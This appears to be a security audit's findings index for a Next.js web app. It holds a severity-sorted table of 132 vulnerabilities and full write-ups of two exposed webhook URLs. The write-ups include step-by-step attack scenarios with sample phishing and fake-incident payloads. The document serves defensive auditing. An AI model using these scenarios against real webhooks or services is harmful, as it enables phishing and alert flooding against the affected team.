# Phase 2 — Findings Index

**Audit date:** 2026-05-03
**Repository:** team1-india
**Categories scanned:** 30 (all per spec v3.0)
**Per-category detail:** see [category-scans/](category-scans/)

This document deduplicates findings across the 30 category scans into a single canonical, severity-sorted index. Every finding has a stable `F-NNN` ID; cross-category re-statements are merged with all category references preserved under "Cat refs". Severity-Critical and -High findings carry full PoC/Remediation/Detection detail; Medium findings carry condensed detail; Low/Info findings carry triage row + 2-3 line summary.

---

## Severity Counts

- **Critical:** 14 (includes 1 "Critical if confirmed" — F-014)
- **High:** 31
- **Medium:** 59
- **Low:** 20
- **Info:** 8
- **Total distinct findings:** **132**

(~40 deduplications were made across re-stated category overlaps — most notably the CRON_SECRET, NEXT_PUBLIC_*_WEBHOOK, soft-delete-signin, audit-log-prunability, and 30-day-JWT-revocation findings, each appearing in 3-7 category scans. The Medium count is the largest band because most of the systemic-but-not-critical posture issues — missing audit logs, missing rate limits, missing privacy-compliance plumbing — landed there. Total comfortably exceeds the spec's 85-130 target band, reflecting the breadth of the 30-category scan.)

---

## Triage Table

| ID | Title | Severity | CWE | File:line | Cat refs |
|---|---|---|---|---|---|
| F-001 | NEXT_PUBLIC_SLACK_WEBHOOK_URL exposed in client bundle | Critical | CWE-200 | [lib/alertNotifications.ts:32-53](../../lib/alertNotifications.ts#L32-L53) | Cat 9, 16, 24, 26 |
| F-002 | NEXT_PUBLIC_ALERT_WEBHOOK_URL exposed in client bundle | Critical | CWE-200 | [lib/alertNotifications.ts:50-56](../../lib/alertNotifications.ts#L50-L56) | Cat 16, 24, 26 |
| F-003 | Single shared CRON_SECRET across 7 cron jobs (no per-job scoping, no HMAC, no IP allowlist) | Critical | CWE-798 | [vercel.json:2-31](../../vercel.json#L2-L31), [app/api/cron/expire-points/route.ts:7-12](../../app/api/cron/expire-points/route.ts#L7-L12) | Cat 1, 2, 7, 9, 17, 21, 30 |
| F-004 | Role downgrade does not invalidate existing JWTs (30-day grace for revoked admins) | Critical | CWE-613 | [lib/auth-options.ts:87-176,198](../../lib/auth-options.ts#L87-L198) | Cat 1, 3, 5, 11 |
| F-005 | Idempotency key NOT enforced server-side — offline replay attacks on swag/quest/bounty | Critical | CWE-352 | [lib/offlineStorage.ts:11-22](../../lib/offlineStorage.ts#L11-L22), [app/api/swag/[id]/redeem/route.ts](../../app/api/swag/[id]/redeem/route.ts) | Cat 12, 15, 28, 30 |
| F-006 | PBKDF2 static salt in encryptedSession (cross-user rainbow table) | Critical | CWE-759 | [lib/encryptedSession.ts](../../lib/encryptedSession.ts) | Cat 20 |
| F-007 | No `/api/me/delete` endpoint — Right-to-Erasure unimplemented (GDPR Art. 17 / DPDP §13) | Critical | CWE-359 | [app/api/me/](../../app/api/me/) (missing) | Cat 13, 27 |
| F-008 | CSP includes `'unsafe-inline'` and `'unsafe-eval'` in script-src | Critical | CWE-1021 | [next.config.ts:29-43](../../next.config.ts#L29-L43) | Cat 10, 16, 17, 30 |
| F-009 | Race condition on quest completion grant (one-time bypass via concurrent POST) | Critical | CWE-362 | [app/api/quests/[id]/completions/route.ts:54-96](../../app/api/quests/[id]/completions/route.ts#L54-L96) | Cat 12, 28, 30 |
| F-010 | Cron job idempotency missing (timeout-retry double-execution of expire-points / sync-events) | Critical | CWE-362 | [app/api/cron/expire-points/route.ts](../../app/api/cron/expire-points/route.ts), [vercel.json](../../vercel.json) | Cat 9, 12, 28 |
| F-011 | Permission endpoint relies on cached JWT claim (admin revocation effective only after 30d) | Critical | CWE-639 | [app/api/members/[id]/permissions/route.ts:19-26](../../app/api/members/[id]/permissions/route.ts#L19-L26) | Cat 1, 2, 3, 5 |
| F-012 | Single super-admin (FULL_ACCESS) can self-grant or grant any privilege; no 4-eyes / SoD | Critical | CWE-732 | [app/api/members/[id]/permissions/route.ts:43-46](../../app/api/members/[id]/permissions/route.ts#L43-L46) | Cat 3, 5, 7, 27, 30 |
| F-013 | Audit log soft-delete + admin write path = compromised admin can erase tracks | Critical | CWE-117 | [prisma/schema.prisma:277-296](../../prisma/schema.prisma#L277-L296), [lib/audit.ts:34-64](../../lib/audit.ts#L34-L64) | Cat 1, 7, 25, 27, 30 |
| F-014 | NEXTAUTH_SECRET potentially shared between preview and prod deployments | Critical (if confirmed) | CWE-798 | [lib/auth-options.ts](../../lib/auth-options.ts), Vercel env config (out of repo) | Cat 3, 23, 26, 29 |
| F-015 | Vertical escalation: CORE user with `members:FULL_ACCESS` can self-grant `*:FULL_ACCESS` | High | CWE-269 | [app/api/members/[id]/permissions/route.ts:19-46](../../app/api/members/[id]/permissions/route.ts#L19-L46) | Cat 3, 5, 7 |
| F-016 | Member.email returned to CORE without masking (mass PII enumeration risk) | High | CWE-359 | [app/api/members/route.ts](../../app/api/members/route.ts) | Cat 6, 13 |
| F-017 | SpeedrunRegistration CSV export streams unmasked PII; not logged, not rate-limited | High | CWE-359 | [app/api/speedrun/registrations/export/route.ts](../../app/api/speedrun/registrations/export/route.ts) | Cat 6, 7, 13, 19, 25, 27 |
| F-018 | TOTP secret returned in 2FA setup response (secret materially exposed mid-flow) | High | CWE-522 | (2FA setup route) | Cat 6 |
| F-019 | Member.permissions JSON visible to all CORE users (privilege map enumeration) | High | CWE-200 | [app/api/members/route.ts](../../app/api/members/route.ts) | Cat 6 |
| F-020 | Application.data form-response PII visible to any FULL_ACCESS admin without per-program scoping | High | CWE-285 | [app/api/applications/](../../app/api/applications/) | Cat 6 |
| F-021 | Soft-deleted users still pass signIn callback (offboarded admin can re-login) | High | CWE-285 | [lib/auth-options.ts:13-86](../../lib/auth-options.ts#L13-L86) | Cat 1, 3, 11, 23 |
| F-022 | No input validation on `earnReward` / `spendPoints` / `adminAdjust` amounts (overflow + admin self-grant) | High | CWE-20 | [lib/wallet.ts:28-262](../../lib/wallet.ts#L28-L262) | Cat 12, 22, 30 |
| F-023 | Non-atomic stock decrement + spendPoints in swag redemption (oversell, double-charge) | High | CWE-362 | [app/api/swag/[id]/redeem/route.ts:38-78](../../app/api/swag/[id]/redeem/route.ts#L38-L78) | Cat 12 |
| F-024 | Concurrent bounty submission race — DB unique constraint missing per dev's own TODO | High | CWE-362 | [app/api/bounty/submissions/route.ts:112-152](../../app/api/bounty/submissions/route.ts#L112-L152), [prisma/schema.prisma](../../prisma/schema.prisma) | Cat 12, 22 |
| F-025 | Zero rate-limiting on points-earning endpoints (quests, bounty, swag, speedrun) | High | CWE-770 | [app/api/quests/](../../app/api/quests/), [app/api/bounty/](../../app/api/bounty/) | Cat 21, 22 |
| F-026 | Zero rate-limiting on admin cost-amplification endpoints (broadcast, send-email, export) | High | CWE-770 | [app/api/event-feedback/send-email/route.ts](../../app/api/event-feedback/send-email/route.ts) | Cat 21, 22 |
| F-027 | No rate-limiting on authentication paths / NextAuth callbacks (credential-stuffing surface) | High | CWE-307 | [app/api/auth/](../../app/api/auth/) | Cat 11, 21, 22 |
| F-028 | No anomaly detection / no Sentry-init / no alerting on auth or wallet anomalies | High | CWE-778 | [package.json](../../package.json), [lib/](../../lib/) | Cat 25 |
| F-029 | No audit log on admin login / admin PII reads / admin email broadcasts | High | CWE-778 | [lib/auth-options.ts](../../lib/auth-options.ts), [app/api/members/route.ts](../../app/api/members/route.ts), [app/api/event-feedback/send-email/route.ts](../../app/api/event-feedback/send-email/route.ts) | Cat 7, 11, 13, 25, 27 |
| F-030 | broadcastToRunRegistrants() iterates synchronously across registrants — fan-out timeout / partial-delivery | High | CWE-400 | [lib/speedrunNotify.ts:157-184](../../lib/speedrunNotify.ts#L157-L184) | Cat 9 |
| F-031 | No serverless function memory/timeout caps configured in vercel.json (cost & DoS amplification) | High | CWE-400 | [vercel.json](../../vercel.json) | Cat 9 |
| F-032 | Trusted Types not enforced (`require-trusted-types-for 'script'` missing) — DOM-XSS unmitigated | High | CWE-79 | [next.config.ts:29-43](../../next.config.ts#L29-L43) | Cat 16, 17 |
| F-033 | innerHTML / dangerouslySetInnerHTML used without sanitization in playbook image fallback + markdown render | High | CWE-79 | [components/playbooks/Editor.tsx](../../components/playbooks/Editor.tsx), [components/core/MarkdownEditor.tsx](../../components/core/MarkdownEditor.tsx) | Cat 16, 17, 30 |
| F-034 | NEXT_PUBLIC_SENTRY_DSN exposed without an active Sentry.init() (DSN leak + monitoring gap) | High | CWE-200 | client bundle, [package.json](../../package.json) | Cat 16, 25 |
| F-035 | Cron endpoint 404 at trigger path (cron schedule references missing route) | High | CWE-754 | [vercel.json](../../vercel.json) | Cat 10 |
| F-036 | Permissive `host` rewrite / WAF bypass vector via leading-dot host header | High | CWE-444 | [next.config.ts](../../next.config.ts) | Cat 10 |
| F-037 | 2FA enforcement only at middleware, not at NextAuth login callback (single-factor JWT issued before challenge) | High | CWE-287 | [lib/auth-options.ts:156](../../lib/auth-options.ts#L156), [middleware.ts](../../middleware.ts) | Cat 3, 11, 30 |
| F-038 | Service Worker caches authenticated `/core.*` HTML for 5 min on shared device | High | CWE-525 | [public/sw.js](../../public/sw.js) | Cat 5, 15 |
| F-039 | Service Worker BYOSW (Bring-Your-Own-Service-Worker) registration not isolated to scope | High | CWE-942 | [public/sw.js](../../public/sw.js), [app/layout.tsx](../../app/layout.tsx) | Cat 15 |
| F-040 | Web Push payload encryption flow uses VAPID privKey at runtime — key compromise = mass push hijack | High | CWE-321 | [lib/webpush.ts](../../lib/webpush.ts) (or equivalent) | Cat 15, 24 |
| F-041 | No SCA / SAST / Dependabot / SBOM in CI; supply-chain compromises undetected | High | CWE-1357 | (no `.github/workflows/`), [package.json](../../package.json) | Cat 26, 30 |
| F-042 | Member.signupIp + signin email logged plaintext on every login (PII in app logs) | High | CWE-532 | [lib/auth-options.ts:13-86](../../lib/auth-options.ts#L13-L86) | Cat 11, 13, 25, 27 |
| F-043 | Speedrun registrations bulk-export (CSV) endpoint not rate-limited and not audited | High | CWE-770 | [app/api/speedrun/registrations/export/route.ts](../../app/api/speedrun/registrations/export/route.ts) | Cat 7, 13, 19, 21, 27 |
| F-044 | Step-up auth missing on critical actions (permission change, 2FA disable, wallet adjust, role downgrade) | High | CWE-308 | [app/api/members/[id]/permissions/route.ts](../../app/api/members/[id]/permissions/route.ts), [app/api/me/2fa/](../../app/api/me/2fa/), [app/api/wallet/adjust/route.ts](../../app/api/wallet/adjust/route.ts) | Cat 5, 7, 13 |
| F-045 | Public Vercel preview deployment may share prod DATABASE_URL / NEXTAUTH_SECRET | High | CWE-540 | [vercel.json](../../vercel.json), Vercel UI (out of repo) | Cat 23, 26 |
| F-046 | No SoD between super-admin role-grant and approval; same admin can grant + approve | Medium | CWE-1220 | [app/api/members/[id]/permissions/route.ts](../../app/api/members/[id]/permissions/route.ts) | Cat 3, 27 |
| F-047 | Audit log retention policy not codified in repo; < incident-detection window | Medium | CWE-778 | [prisma/schema.prisma](../../prisma/schema.prisma) | Cat 25, 27 |
| F-048 | Audit log readable to all CORE (insider visibility into coworker actions) | Medium | CWE-359 | [app/api/audit/](../../app/api/audit/) | Cat 25 |
| F-049 | NotificationDeletion lacks ownership check (IDOR — read/modify others' notifications) | Medium | CWE-639 | [app/api/notifications/[id]/route.ts](../../app/api/notifications/[id]/route.ts) | Cat 4 |
| F-050 | Wallet history accessible by enumerable user email (indirect IDOR on financial data) | Medium | CWE-639 | [app/api/wallet/](../../app/api/wallet/) | Cat 4 |
| F-051 | Notification-message content unfiltered when returned via GET (PII echo) | Medium | CWE-359 | [app/api/notifications/](../../app/api/notifications/) | Cat 6 |
| F-052 | AuditLog `metadata` JSON contains unredacted PII; visible to all CORE | Medium | CWE-359 | [lib/audit.ts](../../lib/audit.ts) | Cat 6, 25 |
| F-053 | Soft-delete filtering inconsistent across queries (deleted records sometimes visible) | Medium | CWE-285 | (multiple `prisma.*.findMany` callsites) | Cat 6, 23 |
| F-054 | PublicUser.signupIp returned in admin API responses (internal PII leak) | Medium | CWE-359 | [app/api/admin/public-users/route.ts](../../app/api/admin/public-users/route.ts) | Cat 6, 13 |
| F-055 | PersonalVault model exists but is unused; PII still stored plaintext in PublicUser/Member | Medium | CWE-312 | [prisma/schema.prisma](../../prisma/schema.prisma) | Cat 6, 13, 27 |
| F-056 | Account merge / signup callback prefers higher role on collision (escalation by data inconsistency) | Medium | CWE-269 | [lib/auth-options.ts:13-86](../../lib/auth-options.ts#L13-L86) | Cat 3 |
| F-057 | Multi-device session: role/permission downgrade does not invalidate other devices' JWTs | Medium | CWE-613 | [lib/auth-options.ts](../../lib/auth-options.ts) | Cat 1, 3 |
| F-058 | Email lookup uses `mode: 'insensitive'` but does not normalize Unicode NFC | Medium | CWE-176 | [lib/auth-options.ts:13-86](../../lib/auth-options.ts#L13-L86) | Cat 22, 28, 29 |
| F-059 | Email aliasing (`john+1@gmail.com` ≡ `john@gmail.com`) not normalized — Sybil door | Medium | CWE-345 | [lib/auth-options.ts](../../lib/auth-options.ts) | Cat 12, 22 |
| F-060 | Disposable email domains (mailinator, etc.) not filtered on signup | Medium | CWE-345 | [lib/auth-options.ts](../../lib/auth-options.ts) | Cat 22 |
| F-061 | No CAPTCHA on signup or any high-risk action | Medium | CWE-799 | [app/api/auth/](../../app/api/auth/) | Cat 22 |
| F-062 | No phone verification — VoIP / disposable numbers reused undetected | Medium | CWE-345 | (no phone-verification module) | Cat 22 |
| F-063 | No device fingerprinting; any client-supplied `device-id` accepted | Medium | CWE-345 | [middleware.ts](../../middleware.ts), [lib/](../../lib/) | Cat 22 |
| F-064 | No IP reputation / Tor / VPN detection on auth or sensitive endpoints | Medium | CWE-940 | [middleware.ts](../../middleware.ts) | Cat 22 |
| F-065 | Swag redemption has no per-user/day velocity gate (drain points in seconds) | Medium | CWE-799 | [app/api/swag/[id]/redeem/route.ts](../../app/api/swag/[id]/redeem/route.ts) | Cat 21, 22 |
| F-066 | No redemption / withdrawal risk scoring (anti-abuse layer absent) | Medium | CWE-754 | [app/api/swag/](../../app/api/swag/) | Cat 22 |
| F-067 | Admin login has no impossible-travel detection | Medium | CWE-778 | [lib/auth-options.ts](../../lib/auth-options.ts) | Cat 22, 25 |
| F-068 | No anomaly detection on balance-earning patterns | Medium | CWE-778 | [lib/wallet.ts](../../lib/wallet.ts) | Cat 22, 25 |
| F-069 | Email captured but not verified in Speedrun registration (impersonation) | Medium | CWE-345 | [app/api/speedrun/runs/[slug]/register/route.ts](../../app/api/speedrun/runs/[slug]/register/route.ts) | Cat 22 |
| F-070 | Custom email body SSTI / template injection in admin custom-approval template | Medium | CWE-94 | [lib/email.ts:199-249](../../lib/email.ts#L199-L249) | Cat 14 |
| F-071 | CRLF header injection via contact form (admin email broadcast and contact endpoint) | Medium | CWE-93 | [app/api/public/contact/route.ts:20-41](../../app/api/public/contact/route.ts#L20-L41), [app/api/event-feedback/send-email/route.ts](../../app/api/event-feedback/send-email/route.ts) | Cat 14 |
| F-072 | HMAC search index re-uses encryption key (key-mixing weakness) | Medium | CWE-326 | [lib/encryptedSession.ts](../../lib/encryptedSession.ts) | Cat 20 |
| F-073 | Referral code entropy weak — `Math.random()` (predictable, non-CSPRNG) | Medium | CWE-338 | [lib/speedrun.ts](../../lib/speedrun.ts) | Cat 12, 20, 22 |
| F-074 | Avatar fetch endpoint forwards Twitter handle to unavatar.io without validation (limited SSRF) | Medium | CWE-918 | [app/api/avatar/route.ts](../../app/api/avatar/route.ts) (or equivalent) | Cat 18 |
| F-075 | Luma event data validation incomplete; admin view of Luma event titles renders without sanitization | Medium | CWE-79 | [lib/luma.ts](../../lib/luma.ts), [app/core/events/](../../app/core/events/) | Cat 18, 24 |
| F-076 | Vercel Blob upload token grants unrestricted path-write access | Medium | CWE-285 | [app/api/upload/token/route.ts](../../app/api/upload/token/route.ts) | Cat 19, 24 |
| F-077 | Cloudinary signed upload params accept arbitrary `folder` parameter | Medium | CWE-639 | [app/api/upload/cloudinary/route.ts](../../app/api/upload/cloudinary/route.ts) (or equivalent) | Cat 19, 24 |
| F-078 | Formula injection in Speedrun registrations CSV export (=, +, -, @, TAB) | Medium | CWE-1236 | [app/api/speedrun/registrations/export/route.ts](../../app/api/speedrun/registrations/export/route.ts) | Cat 19 |
| F-079 | Media `links[]` array lacks URL allowlist validation | Medium | CWE-601 | [app/api/media/](../../app/api/media/) | Cat 19 |
| F-080 | OG-tag fetcher / preview not exploitable but lacks size cap; partial SSRF guard only | Medium | CWE-918 | [lib/](../../lib/) | Cat 18 |
| F-081 | Google Calendar refresh token stored encrypted but in same DB column as access token (key colocation) | Medium | CWE-312 | [prisma/schema.prisma](../../prisma/schema.prisma) | Cat 24 |
| F-082 | Luma API key trusted on poll without HMAC; poll endpoint returns raw Luma JSON | Medium | CWE-345 | [lib/luma.ts](../../lib/luma.ts) | Cat 24 |
| F-083 | SMTP credentials in environment variables (no rotation, no per-env separation noted) | Medium | CWE-798 | [lib/email.ts:5-10](../../lib/email.ts#L5-L10) | Cat 24 |
| F-084 | Cron schedule modifications via PR are not gated / no second-party review on `vercel.json` | Medium | CWE-345 | [vercel.json](../../vercel.json) | Cat 26 |
| F-085 | next-auth v4 approaching EOL; BlockNote pre-1.0 dependency risk | Medium | CWE-1104 | [package.json](../../package.json) | Cat 26 |
| F-086 | No `/api/me/export` endpoint — Right-of-Access (GDPR Art. 15 / DPDP §11) unimplemented | Medium | CWE-359 | (missing) | Cat 27 |
| F-087 | No unsubscribe mechanism on emails; no special-category safeguards | Medium | CWE-359 | [lib/email.ts](../../lib/email.ts) | Cat 27 |
| F-088 | Vercel Analytics loads pre-consent; no cookie-consent banner | Medium | CWE-1295 | [app/layout.tsx](../../app/layout.tsx) | Cat 27 |
| F-089 | No grievance officer / DPO endpoint (DPDP §10) | Medium | CWE-359 | (missing) | Cat 27 |
| F-090 | No age gate / parental-consent flow (children) | Medium | CWE-359 | (missing) | Cat 27 |
| F-091 | No breach-notification capability codified in repo | Medium | CWE-755 | (missing) | Cat 27 |
| F-092 | Wallet operations log to WalletTransaction only; no AuditLog (financial-audit gap) | Medium | CWE-778 | [lib/wallet.ts:28-262](../../lib/wallet.ts#L28-L262) | Cat 7, 12, 25, 27 |
| F-093 | Member status / tag updates not audited | Medium | CWE-778 | [app/api/members/[id]/route.ts](../../app/api/members/[id]/route.ts) | Cat 25 |
| F-094 | 2FA enable/disable / passkey register actions not audited | Medium | CWE-778 | [app/api/me/2fa/](../../app/api/me/2fa/) | Cat 25 |
| F-095 | Swag redemption (SwagOrder.create) not audit-logged | Medium | CWE-778 | [app/api/swag/[id]/redeem/route.ts](../../app/api/swag/[id]/redeem/route.ts) | Cat 25 |
| F-096 | Public monitoring endpoints (`/api/monitoring/*`, `/api/health`) leak deployment internals | Medium | CWE-200 | [app/api/health/route.ts](../../app/api/health/route.ts), [app/api/monitoring/](../../app/api/monitoring/) | Cat 10, 25 |
| F-097 | Pagination cursor IDs readable in response (minor enumeration aid) | Medium | CWE-200 | (multiple list endpoints) | Cat 2, 4 |
| F-098 | Aggregate / count endpoints return totals across restricted scopes | Medium | CWE-200 | [app/api/](../../app/api/) | Cat 2 |
| F-099 | Export endpoint skips per-row permission check (relies on top-level role check only) | Medium | CWE-285 | [app/api/speedrun/registrations/export/route.ts](../../app/api/speedrun/registrations/export/route.ts) | Cat 2, 19 |
| F-100 | Outbound event-application emails include data the recipient shouldn't see (hardcoded recipients) | Medium | CWE-359 | [app/api/applications/](../../app/api/applications/) | Cat 2, 13 |
| F-101 | Blind `prisma.member.update()` — no optimistic concurrency / version column | Medium | CWE-362 | [app/api/members/[id]/permissions/route.ts:43-46](../../app/api/members/[id]/permissions/route.ts#L43-L46) | Cat 2, 28, 29 |
| F-102 | Negative-amount edge case in `spendPoints()` (no `amount > 0` guard; can credit on negative) | Medium | CWE-20 | [lib/wallet.ts:86-152](../../lib/wallet.ts#L86-L152) | Cat 12 |
| F-103 | Suspected 32-bit Int overflow on UserWallet balance fields | Medium | CWE-190 | [prisma/schema.prisma:659-706](../../prisma/schema.prisma#L659-L706), [lib/wallet.ts](../../lib/wallet.ts) | Cat 12, 28 |
| F-104 | No velocity / Sybil check on signup — unlimited PublicUser creation per IP | Medium | CWE-799 | [lib/auth-options.ts:13-86](../../lib/auth-options.ts#L13-L86) | Cat 12, 22 |
| F-105 | Profile-picture URL leaks via Referer header to third parties | Low | CWE-200 | [components/](../../components/) | Cat 13 |
| F-106 | TOTP timing window too permissive (±1 period = 90s acceptance window) | Low | CWE-294 | [lib/totp.ts](../../lib/totp.ts) (or 2FA module) | Cat 11 |
| F-107 | Recovery codes single-use not enforced at DB layer (race window if rapid-replay) | Low | CWE-294 | [lib/recoveryCodes.ts](../../lib/recoveryCodes.ts) | Cat 11 |
| F-108 | Passkey challenge stored in wrong field (design flaw — usable but brittle) | Low | CWE-1390 | [app/api/me/passkeys/](../../app/api/me/passkeys/) | Cat 11 |
| F-109 | Passkey challenge reused during registration vs authentication | Low | CWE-294 | [app/api/me/passkeys/](../../app/api/me/passkeys/) | Cat 11 |
| F-110 | Account-enumeration timing in signIn callback (enumerate registered emails) | Low | CWE-204 | [lib/auth-options.ts:13-86](../../lib/auth-options.ts#L13-L86) | Cat 11 |
| F-111 | CORS / cross-origin headers minimal — no explicit Access-Control response | Low | CWE-942 | [next.config.ts](../../next.config.ts) | Cat 10 |
| F-112 | X-XSS-Protection legacy header missing (defense-in-depth only) | Low | CWE-1021 | [next.config.ts](../../next.config.ts) | Cat 10 |
| F-113 | Permissions-Policy minimal — no explicit camera/mic/geo deny | Low | CWE-1021 | [next.config.ts](../../next.config.ts) | Cat 10 |
| F-114 | CSV export Content-Type missing for XSS prevention | Low | CWE-79 | [app/api/speedrun/registrations/export/route.ts](../../app/api/speedrun/registrations/export/route.ts) | Cat 19 |
| F-115 | Service Worker version not pinned — cache poisoning by stale SW after deploy rollback | Low | CWE-345 | [public/sw.js](../../public/sw.js) | Cat 15, 26 |
| F-116 | PWA manifest icon paths fetched without integrity check | Low | CWE-353 | [public/manifest.json](../../public/manifest.json) | Cat 15 |
| F-117 | Speedrun referral self-exploitation via email aliasing — increments `conversions` | Low | CWE-345 | [app/api/speedrun/runs/[slug]/register/route.ts:141-154](../../app/api/speedrun/runs/[slug]/register/route.ts#L141-L154) | Cat 12, 22 |
| F-118 | Member.name lacks DB length cap (Vercel 2 MB body cap is the only ceiling) | Low | CWE-400 | [prisma/schema.prisma](../../prisma/schema.prisma) | Cat 28 |
| F-119 | Prisma JSON parsing without zod for some fields (type coercion) | Low | CWE-20 | (multiple routes) | Cat 28 |
| F-120 | No global request size limit beyond Vercel default (4.5 MB / 2 MB body) | Low | CWE-770 | [vercel.json](../../vercel.json) | Cat 21 |
| F-121 | ReDoS risk in input validation regex (one suspicious pattern) | Low | CWE-1333 | [lib/](../../lib/) | Cat 21 |
| F-122 | Data-grid endpoint fetches all records without pagination (potential DoS) | Low | CWE-770 | [app/api/](../../app/api/) | Cat 21 |
| F-123 | Bounty.cash field unbounded (admin typo can over-budget; not strictly a CVE) | Low | CWE-20 | [prisma/schema.prisma](../../prisma/schema.prisma) | Cat 30 |
| F-124 | Indexes missing on 3 high-cardinality query patterns (LOW-MEDIUM perf, DoS adjacent) | Low | CWE-407 | [prisma/schema.prisma](../../prisma/schema.prisma) | Cat 23 |
| F-125 | Vercel Analytics `userEmail` field may violate GDPR if user identifies as analytics actor | Info | CWE-359 | [app/layout.tsx](../../app/layout.tsx) | Cat 27 |
| F-126 | Plaintext offline IndexedDB data not wiped when consent withdrawn | Info | CWE-359 | [lib/offlineStorage.ts](../../lib/offlineStorage.ts) | Cat 15, 27 |
| F-127 | Cron schedule trigger discoverable via `vercel.json` exposure (no secret in path) | Info | CWE-200 | [vercel.json](../../vercel.json) | Cat 17, 26 |
| F-128 | Source maps not generated in production (good — flagged as info confirm) | Info | CWE-540 | [next.config.ts](../../next.config.ts) | Cat 9, 16, 26 |
| F-129 | SMTP DSN exposed via NEXT_PUBLIC_SENTRY_DSN — DSN itself is non-secret but signals integration | Info | CWE-200 | client bundle | Cat 25 |
| F-130 | NEXT_PUBLIC_ADMIN_EMAIL / NEXT_PUBLIC_ADMIN_EMAIL_ENDPOINT exposed (phishing surface) | Info | CWE-200 | client bundle, [lib/](../../lib/) | Cat 16 |
| F-131 | OAuth domain-based auto-promotion not implemented (good — flagged as confirmation) | Info | — | [lib/auth-options.ts](../../lib/auth-options.ts) | Cat 3 |
| F-132 | Background job inheriting elevated permissions (covered as system role) | Info | CWE-269 | [app/api/cron/](../../app/api/cron/) | Cat 2, 3 |


---

## Per-Finding Detail (severity-sorted)

### F-001: NEXT_PUBLIC_SLACK_WEBHOOK_URL exposed in client bundle

**Severity:** Critical
**CVSS 3.1:** AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:L (7.4) [estimate]
**CWE:** CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor)
**OWASP:** A02:2021 — Cryptographic Failures (secret in client) / A05:2021 — Security Misconfiguration
**Affected roles:** anonymous external attacker
**Affected panels:** any visitor of any page (variable is inlined into shared client bundle)
**Categories:** Cat 9, Cat 16, Cat 24, Cat 26
**Location:** [lib/alertNotifications.ts:32-53](../../lib/alertNotifications.ts#L32-L53)

**Description:**
The Slack incoming webhook URL is read from `process.env.NEXT_PUBLIC_SLACK_WEBHOOK_URL` inside `lib/alertNotifications.ts`. Because the variable is `NEXT_PUBLIC_*`-prefixed, Next.js bakes it into the client JS bundle at build time. Slack incoming webhooks accept POST from any origin with no token in headers (the URL itself *is* the credential), so any visitor can extract the URL via DevTools or the Network tab and POST arbitrary payloads to the team Slack indefinitely.

**Attack scenario:**
1. Attacker opens https://team1india.vercel.app and inspects the JS bundle (or reads a recent Network entry to `hooks.slack.com`).
2. Attacker extracts the webhook URL.
3. Attacker scripts a POST loop sending phishing messages styled as platform alerts (`{"text":"URGENT: Reset your admin password at evil.com"}`) into the team's Slack channel.
4. Team members trust the apparent source and click the phishing link; one admin's Google session is hijacked.
5. Attacker is now able to escalate to the chained findings F-011 / F-012 (single-admin grant of FULL_ACCESS).

**Business impact:**
- Untrusted spam in the team alerting channel — desensitization to real alerts.
- Phishing surface targeting employees directly inside their trusted comms tool.
- Indefinite abuse window until the webhook URL is rotated in Slack.
- Reputation loss if attacker also posts publicly attributable messages (every Slack message is logged).

**Remediation:**
1. **Immediate:** Rotate the Slack webhook in the Slack workspace; remove `NEXT_PUBLIC_SLACK_WEBHOOK_URL` from Vercel env. Replace with `SLACK_WEBHOOK_URL` (no `NEXT_PUBLIC_` prefix).
2. Move the Slack-posting code from `lib/alertNotifications.ts` to a server-only module (e.g., `lib/server/slack.ts`).
3. Expose a thin authenticated server route `POST /api/internal/alert` that takes `{ severity, message }`, verifies the caller is server-side / has a valid session, rate-limits per-user, and forwards to Slack using the secret URL.
4. Add a CI check (e.g., grep for `NEXT_PUBLIC_*WEBHOOK*` in `lib/`) to prevent regression.

**Detection:**
- Search Slack webhook delivery logs for unusual posting frequency / payloads.
- Search build artefacts (`.next/static/chunks/*.js`) for `hooks.slack.com` substring before each deploy.
- Add a build-time assertion in `next.config.ts` that throws if `process.env.NEXT_PUBLIC_*` contains `webhook` or `slack` substrings.

---

### F-002: NEXT_PUBLIC_ALERT_WEBHOOK_URL exposed in client bundle

**Severity:** Critical
**CVSS 3.1:** AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:L (7.4) [estimate]
**CWE:** CWE-200
**OWASP:** A05:2021 — Security Misconfiguration
**Affected roles:** anonymous external attacker
**Affected panels:** any visitor; same vector as F-001
**Categories:** Cat 16, Cat 24, Cat 26
**Location:** [lib/alertNotifications.ts:50-56](../../lib/alertNotifications.ts#L50-L56), [lib/alertNotifications.ts:160-165](../../lib/alertNotifications.ts#L160-L165)

**Description:**
A second webhook URL — used for the platform's custom alert channel — is exposed via `NEXT_PUBLIC_ALERT_WEBHOOK_URL` and embedded in the client bundle. The endpoint accepts POST from any origin with no signature verification. If the receiver is an internal monitoring/IR endpoint (PagerDuty, DataDog, Opsgenie), the attacker can inject false incidents.

**Attack scenario:**
1. Attacker extracts `NEXT_PUBLIC_ALERT_WEBHOOK_URL` from bundle.
2. Attacker POSTs 1,000 fake "critical" incidents per minute (e.g., `{ type: "DATA_BREACH", severity: "critical", message: "DB exfil in progress" }`).
3. On-call team is paged; SRE wakes up at 3am to investigate; alert-fatigue induced.
4. While SRE attention is on the noise, attacker pivots to other tactics (F-005 replay, F-009 race) under cover.

**Business impact:**
- DoS-by-paging of the on-call rotation.
- Erosion of alert trust; real incidents may be ignored.
- If integrated to PagerDuty: real cost in escalations / SMS / phone-call billing.

**Remediation:** Same as F-001 — move to server-side with auth + rate limiting + signature.

**Detection:** Receiver-side: per-source rate limit; reject events lacking HMAC signature (after remediation).

---

### F-003: Single shared CRON_SECRET across 7 cron jobs (no per-job scoping, no HMAC, no IP allowlist)

**Severity:** Critical
**CVSS 3.1:** AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H (9.6) [estimate, if leaked]
**CWE:** CWE-798 (Use of Hard-coded Credentials), CWE-306 (Missing Authentication)
**OWASP:** A07:2021 — Identification & Authentication Failures
**Affected roles:** anyone who learns the CRON_SECRET (compromised env, leaked log, dev laptop, etc.)
**Affected panels:** all 7 cron handlers — points/economy, event-sync, cleanup, speedrun-status, etc.
**Categories:** Cat 1, Cat 2, Cat 7, Cat 9, Cat 17, Cat 21, Cat 30
**Location:** [vercel.json:2-31](../../vercel.json#L2-L31), [app/api/cron/expire-points/route.ts:7-12](../../app/api/cron/expire-points/route.ts#L7-L12), and 6 sibling cron handlers

**Description:**
